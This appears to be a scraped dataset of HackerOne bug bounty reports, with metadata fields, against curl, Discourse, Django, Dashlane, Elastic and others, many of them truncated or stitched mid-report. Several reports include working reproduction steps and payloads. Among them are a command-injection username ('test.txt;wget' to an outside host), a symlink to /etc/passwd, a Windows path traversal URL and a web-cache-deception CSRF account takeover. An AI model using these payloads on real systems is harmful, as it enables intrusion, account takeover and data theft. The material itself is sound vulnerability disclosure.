Exploiting any of these issues requires a situation where the attacker can coax the application to create a TLS connection to the same host and port that will be performed by the application itself later on (for example some backend connection or other high security connection the attacker wishes to man in the middle). In these situations the existing connection with less security guarantees may be reused, allowing man in the middle attacks against the later supposedly secure connection, resulting in loss of confidentiality and integrity. Since this requires an active attack it can't be thought to have direct availability impact. In most cases where this would result in exploitation would be scenarios where there would be a privilege barrier between the user providing the connection target addresses  (lower priority) and the libcurl using application performing the actual connections (higher priority). It can also be exploitable in a scenario where the attacker will try to man in the middle connections performed by other users of the same service (lateral attack towards users at the same privilege level).
Exploiting the first two issues is plausible in a situation where the attacker can obtain a valid certificate for the host, but from issuer that doesn't match what the application pinning will check for. If the app uses the blob variants to set up pinning and the attacker is able to obtain a certificate for the specific host from for example Let's Encrypt, the ""pin stripping"" attack would be plausible.
Exploiting the 3rd issue is be possible in a situation where the attacker can write to a location that has the same path but with a different capitalization. One example of such situation would be an application that uses a /tmp, /dev/shm or similar sticky world writable location to store the capath/cainfo/pinned public key file. The attacker would then be able to use the same location but with different file name capitalization to fool the application to reuse the existing connection for later connections that actually would use a different capath, cainfo or pinned public key. This attack requires that the attacker can provide the options for capath, cainfo or the public cert pinning somehow (the application would need to enable this as part of its normal functionality).
Steps To Reproduce:
This proof of concept demonstrates the 3rd issue with the curl tool:

cp /etc/ssl/certs/ca-certificates.crt ca.crt
touch CA.crt
curl --capath /dev/null --cacert $PWD/ca.crt  https://curl.se --next --capath /dev/null --cacert $PWD/CA.crt  https://curl.se

If Curl_ssl_config_matches comparison is implemented correctly the 2nd connection should fail.
Proposed Fix:
In Curl_ssl_config_matches:

Add ""blob"" binary matching for CURLOPT_CAINFO_BLOB and CURLOPT_ISSUERCERT_BLOB
Add case-sensitive matching for CURLOPT_ISSUERCERT value
Use case-sensitive matching for paths and public key cert signature(s)
Ensure that there are no other SSL parameters that are improperly compared or omitted from the equivalence check

curl,1-10,1.0,under-1m,$800.00,Low,3.1,Information Disclosure,CVE-2021-22925: TELNET stack contents disclosure again,"thoger  submitted a report to curl.Jun 11th (about 1 year ago)Summary:
CVE-2021-22898: TELNET stack contents disclosure (#1176461) issue was recently reported for curl and it was addressed in curl 7.77.0:
https://curl.se/docs/CVE-2021-22898.html
https://github.com/curl/curl/commit/39ce47f219b09c380b81f89fe54ac586c8db6bde
https://hackerone.com/reports/1176461
However, the fix applied is not correct and does not completely address the issue.  It helps in cases when long environment variable name is used ('a'*256 + ',b'), but not when the name is short and only the value is long ('a,' + 'b'*256, which is the example mentioned in the curl project advisory).
Steps To Reproduce:
Follow the steps form #1176461, only use NEW_ENV option with short name and long value, such as:
Code 75 BytesWrap lines Copy Download1$ curl telnet://127.0.0.1:23 -t NEW_ENV=`python -c ""print('a,' + 'b'*256)""`
Supporting Material/References:
When parsing NEW_ENV option value with short name and long value, sscanf() returns 2, as it writes to both varname and varval, even though the data in varval is truncated.  Hence such variable is not skipped and is added to the temp[] buffer.  However, the len counter which tracks the amount of data that was already written to temp[] is not updated based on the data written to the buffer in the msnprintf()call, but rather based on the length of the original unparsed data that is stored in tmplen.  The relevant code is here:
https://github.com/curl/curl/blob/curl-7_77_0/lib/telnet.c#L926-L929
When value stored in varval is truncated, len is increased too much and a chunk of uninitialized memory is created in temp[].  The len should only be incremented by strlen(varname) + strlen(varval) + 2.
I wonder if the original fix should be preserved or re-worked.  In addition to not fixing the info leak problem properly, it also causes certain valid option values to be ignored and not sent to a server any more.  Rejected values are of the forms NEW_ENV=a or NEW_ENV=a,.  At least the second one seems like an obviously valid way to set variable a to an empty string.  RFC 1572 defines that environment variable can be sent with empty value and hence NEW_ENV=a, should remain supported.  It also defines that variable can be sent with no value, making NEW_ENV=a a valid option as well.  Note that curl prior to 7.77.0 actually did handle NEW_ENV=a that way, but it looks more like an unintended side effect of how len was incremented by tmplen, as the empty value part was written to temp[] and only subsequently overwritten.  As the telnet protocol support in curl is not likely to be used widely these days, possibly only to interact with some legacy systems, it seems reasonable to prefer a fix that changes behaviour as little as possible.
Impact
Leak of an uninitialized stack memory.
Report #1176461 and the matching curl advisory provide some estimates on how much data can be leaked.  I believe the amount of leaked data is smaller and is less than a half of the temp[] size.  The reason for that is in the check_telnet_options() where option arguments are truncated to 255 characters, and at least half of that must part of the defined variable name or value.

curl,1-10,1.0,under-1m,"$1,000.00",Medium,4.0,Business Logic Errors,CVE-2021-22926: CURLOPT_SSLCERT mixup with Secure Transport,"nyymi  submitted a report to curl.Jun 15th (about 1 year ago)Summary:
libcurl Secure Transport SSL backend fails to secure the CURLOPT_SSLCERT against current directory file overriding the keychain nickname specified.
This leads to the possibility of locally created file overriding the CURLOPT_SSLCERT specified certificate and thus causing denial of service.
Steps To Reproduce:

Configure and build curl against Secure Transport: configure --with-secure-transport && make
Have keychain with client certificate called ""testcert""
Use testcert from keychain to authenticate: ./src/curl -E testcert https://testsite
In current directory execute touch testcert
Try authenticating again ./src/curl -E testcert https://testsite

curl: (58) SSL: Can't load the certificate ""testcert"" and its private key: OSStatus -50
The issue stems from the fact that Secure Transport backend code doesn't seem to prefer the keychain over the local file. The documentation says that local file should be prefixed with ""./"" when used, but the code doesn't have any such checks. Interestingly NSS SSL backend does have the check: https://github.com/curl/curl/blob/master/lib/vtls/nss.c#L432
The impact of this vulnerability is rather limited: In practice it seems to be only usable in causing denial of service against applications using  keychain client certificates.  It could happen in practice for example if executing command in /tmp directory structure or home directory of another user. The user would be able to prevent the app from creating an authenticated connection by creating a file with matching name used for  the keychain nickname used by the app.

curl,1-10,1.0,under-1m,"$1,000.00",Medium,5.45,Double Free,CVE-2021-22945: UAF and double-free in MQTT sending,"z2_  submitted a report to curl.Jul 19th (about 1 year ago)Vulnerability Description
libcurl version 7.77.0 has a Use-After-Free and a Double-Free in lib/mqtt.c in the function mqtt_doing on lines 556 - 563:
Code 202 BytesWrap lines Copy Download1if(mq->nsend) {
2  /* send the remainder of an outgoing packet */
3  char *ptr = mq->sendleftovers;
4  result = mqtt_send(data, mq->sendleftovers, mq->nsend);
5  free(ptr);
6  if(result)
7    return result;
8}
As can be seen in the code above mq->sendleftovers gets freed in line 560 but not set to NULL. If mqtt_doing gets called repeatedly and the values of mq->nsend and mq->sendleftovers don't change this can result in

Sending the metadata of the freed chunk over the network via mqtt_send
Freeing mq->sendleftovers multiple times

mq->nsend and mq->sendleftovers get set in the function mqtt_send if Curl_write cannot send all bytes in the write-buffer at once. This can e.g. happen if write() returns EAGAIN or EWOULDBLOCK. Then Curl_write sets the number of written bytes to 0 and returns CURLE_OK.
This can trigger the vulnerabilities as follows:

Supply an mqtt:// URL to curl
Have some successfull transmissions with mqtt_send
At some point have an unsuccessfull transmission such that not all bytes of the write-buffer can be sent.
This causes mq->sendleftovers and mq->nsend to be set.
Have another invocation of mqtt_doing. The code mentioned above gets executed. mq->sendleftovers gets freed.
If mqtt_send could send all remaining bytes successfully mq->sendleftovers and mq->nsend don't get reset.
Have another invocation of mqtt_doing. Since mq->nsend didn't change curl tries to send the leftover bytes again, triggering the vulnerabilities

Rebuild curl
Start a simple netcat session with: nc -lp 5678
Invoke curl with: curl mqtt://127.0.0.1:5678/

The output:
Code 104 BytesWrap lines Copy Download1free(): double free detected in tcache 2
2[1]    199104 abort (core dumped)  ./curl mqtt://127.0.0.1:5678
And in the terminal where netcat was launched it can be seen
that the content of the freed heap chunk was sent.
Impact
Since double frees of tcache chunks are not detected until glibc version 2.29
this vulnerability is perfectly exploitable for operationg systems using an older
glibc. Causing write() to return EAGAIN is more difficult but not impossible
to manage, e.g. this can always be the case if the peer is not reading as fast as
the curl client is writing (source).
At minimum this can be used to leak heap metadata which can help in exploitation.1 attachment:F1382088: patch",https://hackerone.com/reports/1269242,England,United Kingdom,London,2021,7,19,18,20
curl,1-10,1.0,under-1m,"$1,000.00",Medium,6.5,Missing Required Cryptographic Step,CVE-2021-22946: Protocol downgrade required TLS bypassed,"monnerat  submitted a report to curl.Sep 9th (about 1 year ago)Summary:
In imap and pop3, --ssl-reqd is silently ignored if the capability command failed.
In ftp, a non-standard 230 response (preauthentication?) in the greeter message forces curl to continue unencrypted, even if TLS has been required.
Steps To Reproduce:
Use a parameterizable test server to fail capability command for imap (CAPABILITY reply: A001 BAD Not implemented) and pop3 (CAPA reply: -ERR Not implemented) and to send response code 230 in FTP server greeting message.

curl --ssl-reqd imap://server/...
curl --ssl-reqd pop3://server/...
curl --ssl-reqd --ftp-ssl-control ftp://server/...

These 3 commands are successsful, but network sniffing shows that TLS is never negotiated.
Impact
A MitM can silently deny mandatory TLS negotiation and thus sniff and/or update unencrypted transferred data.3 attachments:F1441786: test985F1441787: test986F1441788: test984",https://hackerone.com/reports/1334111,England,United Kingdom,London,2021,9,9,0,34

curl,1-10,1.0,under-1m,$250.00,Medium,5.2,Heap Overflow,Heap buffer overflow in TFTP when using small blksize,"thomas_v  submitted a report to curl.Aug 29th (3 years ago)Summary:
With a TFTP server that does not send OACK, but instead starts anyway with first block with 512 bytes block size, the curl library fails to assume default 512 bytes blocks. Instead it detects EOF and does not return an error code. Consequence is a truncated file that is 512 bytes without any error code.
My understanding is that from the RFC, a TFTP server might ignore blksize request and anyway send the default 512 bytes block size data.
Unless an OACK is received we should assume 512 block size, whether or not a particular blocksize was requested.
This was introduced by security fix of CVE-2019-5436:
257600341 tftp: use the current blksize for recvfrom()
Potential Fix
We could revert 2576003415625d7b5f0e390902f8097830b82275 and instead malloc the receive buffer for at least 512 bytes, or for the requested blksize if it is bigger. That would address the issue being reported and also the CVE-2019-5436.
Steps To Reproduce:

Use a TFTP server that does not send OACK in response of a particular blksize request, but instead sends directly the first block, of default size (512B).
Run curl asking for a >512 bytes block size like:
curl --tftp-blksize 8192 tftp://9.1.9.1/data.bin --output data.bin
echo $? is 0 and file size is 512 bytes

curl,1-10,1.0,under-1m,"$1,000.00",Medium,5.5,Information Disclosure,CVE-2021-22898: TELNET stack contents disclosure,"nyymi  submitted a report to curl.Apr 27th (2 years ago)Summary:
lib/telnet.c suboption function incorrecly checks for the sscanf return value. Instead of checking that 2 elements are parsed, the code also continues if just one element matches:
if(sscanf(v->data, ""%127[^,],%127s"", varname, varval)) {
As such it is possible to construct environment values that don't update the varval buffer and instead use the previous value. In combination of advancing in the temp buffer by strlen(v->data) + 1, this means that there will be uninitialized gaps in the generated output temp buffer. These gaps will contain whatever stack contents from previous operation of the application.
Fortunately the environment is controlled by the client and not the server. As such this vulnerability can't be exploited by the server. Practical exploitation is limited by the following requirements:

attacker is able to control the environment passed to libcurl via CURLOPT_TELNETOPTIONS (""NEW_ENV=xxx,yyy"") and control xxx and yyy in the curl_slist entries)
attacker is able to either inspect the network traffic of the telnet connection or to select the server/port the connection is established to

When both are true the attacker is able to some content of the stack. Note however that for this leak to be meaningful, some confidential or sensitive information would need to be leaked. This could happen if some key or other sensitive material (that is otherwise out of the reach of the attacker, due to for example setuid + dropping of privileges, or for example only being able to execute the command remotely in a limited fashion, for example php curl, or similar) would thus become visible fully, or partially. The leak is limited to maximum about half of the 2048 byte temp buffer.

Run telnet service

Curve,251-500,0.0,10m-50m,"$1,000.00",Medium,4.3,Business Logic Errors,Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve,"praseudo7  submitted a report to Curve.Aug 13th (3 years ago)Hi,
While testing your android application I've found a business logic flaw by using which a non premium user can update/change the retailers when ever and what ever retailers he wants to.
Curve application has a functionality called ""Earn curve cash"". A non premium user can select only 3 retailers (where as premium user can select 6 or more retailers) at a time. A business logic flaw exists at this endpoint by using which a non premium user can update/change already existing retailers and can use cashback with all the retailers associated with curve application.
Steps to reproduce:
1] Login to non premium user account
2] Navigate to ""Earn curve cash"" and you can select only 3 retailers (because you are non premium user)
3] And click on ""Confirm""
4] You have now added 3 retailers to your account and you dont have any option to edit/update the added retailers.
5] Now go back to ""Earn curve cash"" functionality and make sure to capture the request and response

When am going through all the JS files in curve.com I found a link called ""/usa"" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details. 
Image F874173: Image_2020-06-19_at_2.57.13_PM.png 380.36 KiBZoom in Zoom out Copy Download
Then there is a functionality called ""Track my Position"" by using which joined users can view their position in the waiting lists. 
Image F874174: Image_2020-06-19_at_2.59.13_PM.png 1.27 MiBZoom in Zoom out Copy Download
Well, in UI the application only shows the position number but not any other sensitive details. 
Image F874175: Image_2020-06-19_at_3.23.36_PM.png 797.77 KiBZoom in Zoom out Copy Download
But by using the below reported endpoint an attacker can retrieve all the joined users mobile numbers and the other details by just entering the victims email address.
Steps to Reproduce:
1] Navigate to https://curve.com/usa and click on ""Track my position""
2] Enter any email address and click on ""Submit""
3] Make sure to intercept the request using Burp intercept
4] You'll be presented with the below vulnerable request

praseudo7   posted a comment. Jun 30th (2 years ago)Hi @0xcain ,
Can someone give any update on this vulnerability ? It's been more than 2 weeks that the vulnerability is still out there. This could be a GDPR issue as the ""Curve"" app is from UK country and this lead to huge reputation and revenue loss to the company. It would be better if this vulnerability gets fixed as soon as possible.
Hoping for quick reply from @Curve @0xcain  @hackerone

Dashlane,251-500,0.0,1m-10m,$350.00,Medium,5.3,Improper Restriction of Authentication Attempts,Throttling Bypass - ws1.dashlane.com,"corb3nik  submitted a report to Dashlane.May 3rd (6 years ago)Description
The host at ws1.dashlane.com throttles requests based on the IP address of the user after a certain amount of repeated requests.
By adding the X-Forwarded-For header, an attacker can bypass the throttling completely, rendering the security measure ineffective against DOS attacks. 
Proof of concept

Send a large amount of requests like the following until a {""error"":{""code"":-32600,""message"":""Throttled.""}} message is received.
Send another request with an added X-Forwarded-For header : 
The web server will respond with a successful message instead of a throttled response.

I have attached two screenshots demonstrating the proof of concept.

The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.
Steps

Login as an admin on try.discourse.org, e.g.


http://try.discourse.org/


Make a backup of the website and download it.
Extract the contents of the archive.
Modify one of the usernames of an account you have access to:


test.txt;wget mrzioto.com


Repackage the archive.
Upload the modified archive.
Restore from backup.
Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).
Send the POST request for creating a user export archive:


http://34.205.246.2/export_csv/export_entity.json
POST: entity_type=user&entity=user_archive

Generating a backup creates a tar file consisting of the database as a SQL file and uploaded files from /public/upload/*. Having the ability to upload these tar files and restore from them, you can add any file that you wish. 
Manually modifying the tar archive and adding a symlink, you are able to read any arbitrary file that the user has permission to including files outside of the Discourse application directory.
Steps

Load http://try.discourse.org
Login as an Admin user.
Go to the Backups page:


http://try.discourse.org/admin/backups/


Create a new backup including files.
Extract the backup files to a folder on your server.
Create a symlink to /etc/passwd In the /uploads/ folder of the backup, e.g. /uploads/default/original/1X/[file].jpg.


example: ln -s /etc/passwd /home/symlink/files/uploads/default/original/1X/7ad2e8f5fe02890f20503044b604e29e6f3718fd.png


Create a .tar.gz from the extracted files.
Upload the newly crafted tar to the server.
Enable Restore from Backups in settings if it's not enabled.
Restore from the backup that uploaded.
Go to the uploaded file in your browser after it uploads, e.g.


http://try.discourse.org/uploads/default/original/1X/[file].jpg

Discourse,11-50,0.0,10m-50m,$256.00,Low,2.0,Cross-Site Request Forgery (CSRF),"CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)","fransrosen  submitted a report to Discourse.Aug 16th (5 years ago)Hi,
I noticed this issue on one of your clients which was using CloudFlare in front of their Discourse. This is not affecting try.discourse.org but the same underlying issue can be seen there as well even though it's not exploitable on that specific domain.
The TL;DR of issue is basically: Discourse instance is vulnerable to account takeover if Discourse is served behind a CloudFlare proxy due to the lack of no-cache headers on pages with CSRF-tokens.
As you might understand due to this, the PoC below is not working on try.discourse.org. I haven't provided any other example, but let me know if I should do a trial version setting it up behind CloudFlare myself. My guess is that you maybe want to try this out yourself, since you want to verify that the vanilla setup in CloudFlare still makes Discourse vulnerable.
Background
You might have heard about the Web Cache Deception attack. The idea is basically to fool the cache proxy, in this case CloudFlare, to cache content which belongs to the victim inside the CloudFlare proxy layer. This makes it possible for anyone in the same CloudFlare region to fetch the leaked data without any authentication. 
Any URL having a file ending with one of CloudFlare's mime types will be cached for the whole region. Remember, a region is big and there are only 13 of them in total (in my case, the region is Western Europe). Here's a reference from CloudFlare about their regions.
This attack vector was coined by Omer Gil earlier this year ( https://www.slideshare.net/OmerGil/web-cache-deception-attack ).
Technical details
The issue with Discourse is that there's a lot of routes which all of them exposes the user's CSRF-token as well as the user's username in the header. This applies not only to status 200 but also to status 404.
Here are some routes which will return status 200 on try.discourse.org even if we have appended .css on them (which is a trigger for CloudFlare to cache this URL):
Code 85 BytesWrap lines Copy Download1/u/my/preferences.css
2/u/my/preferences/username.css
3/u/my/preferences/card-badge.css
Results in:
Code 159 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2X-Discourse-Route: users/preferences
3
4HTTP/1.1 200 OK
5X-Discourse-Route: users/preferences
6
7HTTP/1.1 200 OK
8X-Discourse-Route: users/card_badge
(This seems to be a general issue with the X-Discourse-Route: users/* routes)
Also, the normal 404-page actually reveals the current user's CSRF token (this request is done while being signed in):
Code 119 BytesWrap lines Copy Download1GET /u/x.css HTTP/1.1
2Host: try.discourse.org
3
4<meta name=""csrf-token"" content=""aYBW0N/1nfI1PHBa24YNx+...+BJJX+Fg=="" />
You currently don't have try.discourse.org behind CloudFlare, but I've verified with a few instances that I noticed did.
What you will see is the following:
Issuing the following request twice while being signed in:
Code 21 BytesWrap lines Copy Download1GET /u/x.css HTTP/1.1
Will lead to:
Code 20 BytesWrap lines Copy Download1CF-Cache-Status: HIT
As well as:
Code 77 BytesWrap lines Copy Download1X-Discourse-Username: test
2
3<meta name=""csrf-token"" content=""6bE...VnlQ=="" />
Same thing with /u/my/preferences.css.
The issue is that none of these routes, exposing the CSRF-token and the username, has any Pragma, Cache-Control or Expire-headers, so there's nothing that tells CloudFlare not to cache these URLs.
PoC
You need an instance behind a CloudFlare-proxy, with no settings more than just enabling CloudFlare on the domain:
Image F213373: Screen_Shot_2017-08-16_at_14.07.00.png 14.08 KiBZoom in Zoom out Copy Download
Now, we can use the following script as a PoC, remember that if we would attack someone, we would need to fetch the URL server-side from the same CloudFlare-region as the victim. This should be no problem, since there's only 13 regions in total.
What this script will do is this:

Victim is signed in to a Discourse instance which is behind a CloudFlare-proxy
Victim vists a malicious page by the attacker
The page will issue three requests using img-tags to /u/$rand.css, to make sure that the CloudFlare cache is tainted with the current user and its CSRF-token
After the images has loaded, the PHP-script will fetch the same URL server-side, which requires the PHP-script to be in the same CloudFlare region (my region right now for example is Western Europe).
The script will extract the username from the X-Discourse-Username header and the CSRF-token from the HTML
The PHP-script will return these two values to the malicious site, and a form will be crafted:

Code 120 BytesWrap lines Copy Download1POST /users/$username/preferences/email.json HTTP/1.1
2 
3_method=PUT&email=$attacker_email&authenticity_token=$csrf_token

Email is now changed for the victim, the attacker will get a verification email. When attacker have clicked on the verification email, the email is now changed. The victim will however get an email saying the email was changed, but the change has already happened.

Here's the script. It seems like _forum_session-token has SameSite=lax which is great, however, this is not yet implemented in Firefox, so try this in Firefox. You need to point it to an instance which is behind CloudFlare proxy.

If you try this against a Discourse instance while being signed in, you should see something like this when visiting this script:

Mitigations
Add the no-cache headers, Cache-Control and/or Expire on any of the templates that outputs the CSRF-token, this will prevent CloudFlare from caching information which is user specific. I would also recommend doing the same thing when the X-Discourse-Username is returned.
Let me know if you need any additional information.

fransrosen   changed the status to New. Updated Jan 14th (5 years ago)Hi,
Sorry for the late reply here. I finally got an approval from Algolia to make my PoC using their Discourse-instance, which was also the site I found this on initially. Their setup of Discourse is using SSO to their regular site, but I can still do the account takeover by changing the email address in Discourse.
The bug is reproducible in Firefox, for some reason the SameSite: Lax is not really working in that browser, so _forum_session is still sent with the image embedding from my test-page, and the form-posting with the CSRF-token actually also works. I'm testing with Firefox 57.0.4 in macOS 10.13.2.
You need to run the PHP-code in the same region as you're in when trying, this is because the CloudFlare region is the one doing the cache of .css. As mentioned, CloudFlare only have 13 regions so it should be fairly straight forward.
My code looks like this in the demo:
Code 2.40 KiBWrap lines Copy Download1<?

10	$data = file_get_contents($discourse.$file, false, $ctx);
11	preg_match('/name=""csrf-token"" content=""([a-zA-Z0-9\/=+]+)""/', $data, $matches);
12	if(!empty($matches[1])) {
13		preg_match('/X-Discourse-Username: (.*)/', implode(""\n"", $http_response_header), $name_matches);

And the flow looks like this:

Sign up for Algolia at https://www.algolia.com/users/sign_up
When done, go to https://discourse.algolia.com/ and ""Log in""
Make sure the PHP-file is running on the same CloudFlare region, you can try it locally by: php -S localhost:8000 algolia.php
Change the email address in the PHP-script to something else maybe, so you see that you indeed get the confirmation email sent to the new address to confirm the change.
Go to http://localhost:8000 in Firefox.

You should see an alert that the email was changed. This is also the point when the attacker gets a ""Confirm your new address"" to their inbox as my video shows.

The reason why all this works to refresh everyones memory on this bug, is that any path under /u/*.css will respond when signed in with CSRF-tokens in the error page. Since there are no proper Cache-Control headers on this 404 page, CloudFlare will happily cache the file since it thinks it's a CSS-file. If there would be a Cache-Control: no-cache whenever CSRF-tokens are in the templates, this attack would not work.
Also, to show you that it does in fact get cached on CloudFlare, here are the same URL tried in my region, and all of them are showing the user's CSRF-token when the file was requested, which is the one I'm using to trigger the email-change:

The only setup Algolia made here was to put the Discourse-application behind CloudFlare. This is a regular setup if you're using CloudFlare's proxy to speed up the website and to hide the origin and sometimes make sure you're protected against DDoS.
Hope this helps, and sorry for my late reply.

I haven't confirmed the fix yet but I have seen fixes been done by always serving Cache-Control: no-cache whenever the current user is signed in, as some cache settings in Cloudflare also allows caching 404 responses if no cache-header is present.

Login as an administrator to Discourse and create a topic which can only be viewed by the staff.
Copy the topic's id from the topic's page. the topic id can be found by browsing the topic and then copying the number in the end of the url (http://localhost:4000/t/{topic-name}/{topic-id})
Login with a non-admin user.
Go to any topic you have access to, and type in the following reply:

Code 51 BytesWrap lines Copy Download1http://localhost:80/t/blablabla/?source_topic_id=29
please note that the port should 80 or 443 even if the url of your local installation is a different (probably some software bug)
5. Wait for the preview to load and see that you can see topic's content.
Root cause
The following piece of code determines if the logged-in user is capable of viewing the post/topic :
Code 475 BytesWrap lines Copy Download1        def can_see_post?(post, source_topic)
2          return false if post.nil? || post.hidden || post.trashed? || post.topic.nil?
3          Guardian.new.can_see_post?(post) || same_category?(post.topic.category, source_topic)
4        end
5
6        def can_see_topic?(topic, source_topic)
7          return false if topic.nil? || topic.trashed? || topic.private_message?
8          Guardian.new.can_see_topic?(topic) || same_category?(topic.category, source_topic)
9        end
as can be seen here: https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L113
However, the source_topic parameter is controlled directly by user input:
Code 59 BytesWrap lines Copy Download1source_topic_id = @url[/[&?]source_topic_id=(\d+)/, 1].to_i
as can be seen here:
https://github.com/discourse/discourse/blob/master/lib/onebox/engine/discourse_local_onebox.rb#L47
So if we pass in the same topic id as the one we are trying to view, basically the function same_category will always return true, effectively bypassing any protection in place.

The attacker is able to send internal server side requests using Ruby client.
Check the attached screens for prove.
Why does the vulnerability exist?
discourse.org does not properly validate user input and does not configure ruby client properly which allows an attacker to use various  protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and discourse will make such a FTP request.
If the description is not clear please feel free to ask us for more detailed report.

The vulnerability exists because of absence of oembed variables values escaping.
There is the oembed link in the payload page:
Code 76 BytesWrap lines Copy Download1<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>
As you can see the onebox parser goes to this oembed URL to get the data:

Django,1-10,1.0,No value,"$1,000.00",No value,0.0,None,CSRF protection bypass on any Django powered site via Google Analytics,"bobrov  submitted a report to Django.Sep 1st (8 years ago)I shall explain all the steps to create the final PoC in order to be more clear.
Part 1. Cookie Injection via Google Analytics
(Reported to Google, rewarded, still working)


Google Analytics sets the cookie to track user source:
__utmz=123456.123456789.11.2.utmcsr=[HOST]|utmccn=(referral)|utmcmd=referral|utmcct=[PATH]
For example:
__utmz=123456.123456789.11.2.utmcsr=blackfan.ru|utmccn=(referral)|utmcmd=referral|utmcct=/path/


User fully controls path in Referer and it is not filtered before being put in __utmz


Part 2. Cookie parsing peculiarities by different web servers


A typical Cookie sent by a web browser looks like this:
Cookie: param1=value1; param2=value2;


Many web servers accept cookies delimited not only by semicolons but also by commas:
Cookie: param1=value2, param2=value2
Cookie: param1=value2,param2=value2


Python + Django handle cookies with incorrect regular expression that allows to use characters [ \ ] as delimiters:
Cookie: param1=value1]param2=value2


https://docs.python.org/3/library/http.cookies.html
http://hg.python.org/cpython/file/3.4/Lib/http/cookies.py#l432
http://tools.ietf.org/html/rfc2109
http://tools.ietf.org/html/rfc2068
Example:
Code 133 BytesWrap lines Copy Download1>>> from http import cookies
2>>> C = cookies.SimpleCookie()
3>>> C.load('__utmz=blah]csrftoken=x')
4>>> C
5<SimpleCookie: csrftoken='x'>
Part 3. Cookie handling peculiarities in different web browsers
(Reported to Google, won't fix)


For all the web browsers except Safari characters of space, comma, and [ \ ] can be used as cookie values


Chrome handles only a limited number of cookie-attributes, e.g.:
Set-Cookie: test=test; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=.google.com; domain=blah.blah.blah.google.com;
will set cookie for .google.com but not for blah.blah.blah.google.com


Combining all these facts
Provided that:

A site uses Google Analytics
This site is hosted by a web server that has some of the aforementioned cookie parsing peculiarities (e.g. Django)
This site implements Cookie based CSRF protection (a value in Cookie and some request parameter must be equal)

Then:

We can set new arbitrary cookies or redefine the values of existing ones
This site is vulnerable to CSRF protection bypass

The principal problem of __utmz cookie is that it is set for six months and is not refreshed. This problem can be solved in Google Chrome if you find a subdomain with Google Analytics and rewrite attribute ""domain"" using the peculiarity that has been described in part 3 with the value "".site.com"".
In other browsers the vulnerability can be exploited by cookie injection at the moment of __utmz refreshing.

Today I took a look at Dropbox Paper and noticed there is an option to export/download the project as a Markdown or word (docx) document. I noticed it doesn't filter any kind of Markdown escaping, meaning when parsed after download will let us execute client side code. (equivallent to arbritary file read or code execution if executed from file:/// or local scheme)
I think the markdown download should sanitize against these payloads that can generate these security holes. sample paylaod I used was:

there is a race condition when redeeming coupon codes in https://www.dropbox.com/coupons. Basically, it enables me to reuse one coupon code many times.
Here are the steps to reproduce:

Get a coupon code. I bought mine on fiverr.
Go to https://www.dropbox.com/coupons and enter your code
Click submit; a POST request will be made to /coupons - intercept it
Repeat that request many times in short time frame. 
Hopefully, promo code will be added multiple times to your account.

I have attached a screenshot of my accounts page with one code redeemed multiple times.

Dear Team,
Since  #1168528 was resolved. I have checking again for other roles. At Dev Role with Limited Engine Access, an user still can access API endpoint
/api/as/v1/credentials/ to get all API keys (private-key, search-key ... )
Steps To Reproduce:
1 - Log in Kibana with the admin (elastic) user and go to the Stack Management > Users page (/app/management/security/users/)
2 - Choose an username , password and role for this user. For example you can choose username: dev
3 - Log in App Search with the admin (elastic) user and go to the Users & roles page (/as#/role-mappings/)
4 - Click Add mapping
5 - External Attribute choose username , in the Attribute value field enter dev
6 - In the Role box select Dev
7 - In Engine Access select Limited Engine Access, no need to select any engine
8 - Login to App Search with user dev
9 - Go to endpoint https://your_app_search_instance/api/as/v1/credentials/
10 - You still can get all api keys

Impact
Privilege escalation. The default App Search install has a Private API Key with read/write access to all engines. If a Private Admin Key has been created before. the attacker can use it to create new API keys or delete existing ones.
With Limited Engine Acess, an user should create and managed their own api keys",https://hackerone.com/reports/1218680,California,United States,Mountain View,2021,6,6,19,56

Elastic,1001-5000,0.0,1m-10m,$570.00,Low,3.1,Path Traversal,Fix for CVE-2021-22151 (Kibana path traversal issue) can be bypassed on Windows,"dee-see  submitted a report to Elastic.Sep 28th (about 1 year ago)Summary
Hello team, I hope you're doing well! I was combing through your GitHub repository to look at the fixes for recent security releases and found the fix for CVE-2021-22151 to be incomplete. The current fix makes assumptions that are true on Linux but that don't hold on Windows.
Details
The fixed code looks like this
Code 359 BytesWrap lines Copy Download1      const range = path.normalize(request.params.range);
2      return range.startsWith('..')
3        ? response.notFound()
4        : new Promise((resolve) => {
5            const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);
6            fs.readFile(fontPath, (error, data) => {
7                // snipped
8            });
9          });
The assumption is that any path traversal attempts, once normalized, will start with ... This seems to hold on Linux, however on Windows this can happen (using the NodeJS REPL for demonstration here):
Code 304 BytesWrap lines Copy Download1> let range = path.normalize('c:../../../../../../../path_traversal')
2undefined
3> console.log(range)
4c:..\..\..\..\..\..\..\path_traversal
5> range.startsWith('..')
6false
7> const fontPath = path.join(__dirname, 'fonts', 'open_sans', `${range}.pbf`);
8undefined
9> console.log(fontPath)
10c:\path_traversal.pbf
Path traversal happened even if the range didn't start with ...
Steps to reproduce
This requires Kibana to be installed on Windows.

Put a .pbf file somewhere on disk for demonstration. I did it with echo hax > c:\path_traversal.pbf
Visit http://localhost:5601/api/maps/fonts/open_sans/c%3A..%2F..%2F..%2F..%2F..%2F..%2F..%2Fpath_traversal and the file from the previous step will be downloaded

You might need to add some ..%2f depending on how deep Kibana is installed.



Remediation
Thom Heymann already had a great suggestion in their code review

The best way to solve this is to resolve the path from range and ensure it is inside your fonts directory.

I think this would fix the issue once and for all!
Impact

Elastic,1001-5000,0.0,1m-10m,"$7,500.00",Critical,9.5,Privilege Escalation,RCE hazard in reporting (via Chromium),"alexbrasetvik  submitted a report to Elastic.Apr 19th (2 years ago)Summary: Reporting embeds a Chromium that is susceptible to RCEs
Description:
